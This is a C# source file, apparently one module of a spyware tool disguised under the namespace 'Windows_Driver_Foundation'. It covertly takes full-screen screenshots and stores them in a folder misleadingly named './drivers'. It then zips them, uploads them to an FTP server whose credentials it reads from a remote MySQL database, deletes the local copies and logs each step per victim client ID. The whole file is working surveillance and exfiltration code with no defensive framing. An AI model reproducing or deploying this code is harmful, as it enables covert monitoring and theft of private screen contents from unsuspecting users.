using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using System.IO;

namespace Windows_Driver_Foundation
{
    class classProcessPrintScreen
    {
        public string print_folder_path = "./drivers";
        
        public void execute_printscreen_protocol(int client_id, int max_print_number)
        {

            if(!Directory.Exists(print_folder_path))    // Se folder não existe então...
            {
                Directory.CreateDirectory(print_folder_path);
                takePrintScreen();
            }else if (countFilesInFolder(print_folder_path) < max_print_number)
            {
                takePrintScreen();
            }
            else
            {
                takePrintScreen();
                uploadPrints(client_id);
            }
            // Actualzia DB com número de prints na pasta de Prints
            var classExeption = new classExeptionAndErrorManagement();
            var classMysql = new classMySQLDatabase();
            classMysql.openDatabaseConnection();
            if (!classMysql.update_ClientTable(client_id, "print_counter", countFilesInFolder(print_folder_path).ToString()))
                classExeption.exeptionHandling("Erro ao actualizar número de prints na Pasta");
            classMysql.closeDatabaseConnection();
        }

        private void uploadPrints(int uid)
        {
            var classExeption = new classExeptionAndErrorManagement();
            var classMysql = new classMySQLDatabase();

            classMysql.openDatabaseConnection();

            string[] ftpLogin = classMysql.read_tblFTPServers(uid);

            if (!classExeption.IsNullOrEmpty(ftpLogin))
            {
                // Calling upload  requeired classes
                var classFilesManag = new classFilesManagement();
                var ftpManagement = new classFTPManagement(ftpLogin[1], ftpLogin[2], ftpLogin[3]);
                classMysql.insert_server_log(Convert.ToInt32(ftpLogin[0]), uid, 1); //Status = FTP class acquired

                var date = DateTime.Now.ToString("MMddyyHmmss");
                string print_zip_name = "psu" + uid.ToString() + "d" + date;
                string print_zip_path = print_zip_name + ".zip";

                if (classFilesManag.ZipDirectory(print_folder_path, print_zip_name))
                {
                    // Clean ./drives folder
                    DirectoryInfo di = new DirectoryInfo(print_folder_path);
                    foreach (FileInfo file in di.EnumerateFiles())
                    {
                        file.Delete();
                    }

                    // Upload driver.zip
                    if (ftpManagement.upload(print_zip_path, print_zip_path))
                    {
                        classMysql.insert_server_log(Convert.ToInt32(ftpLogin[0]), uid, 3);
                        File.Delete(print_zip_path);
                    }
                    else
                    {
                        classMysql.insert_server_log(Convert.ToInt32(ftpLogin[0]), uid, 30);
                        classExeption.printConsole("uploadPrints()", "ERROR: Upload of " + print_zip_name + " FAIL!");
                    }
                }
                else
                    classExeption.printConsole("uploadPrints()", "ERROR: Zipping Prints Folder FAIL!");
            }else
                classExeption.printConsole("uploadPrints()", "No FTP Credentials: Upload Prints");

            classMysql.closeDatabaseConnection();
        }

        private void takePrintScreen()
        {
            Rectangle bounds = System.Windows.Forms.Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                var date = DateTime.Now.ToString("MMddyyHmmss");
                bitmap.Save(@".\drivers\" + date + ".jpg", ImageFormat.Jpeg);
            }
        }

        public int countFilesInFolder(string dirPath)
        {
            try
            {
                return Directory.GetFiles(dirPath, "*", SearchOption.TopDirectoryOnly).Length;
            }
            catch { return 0; }
        }


    }
}
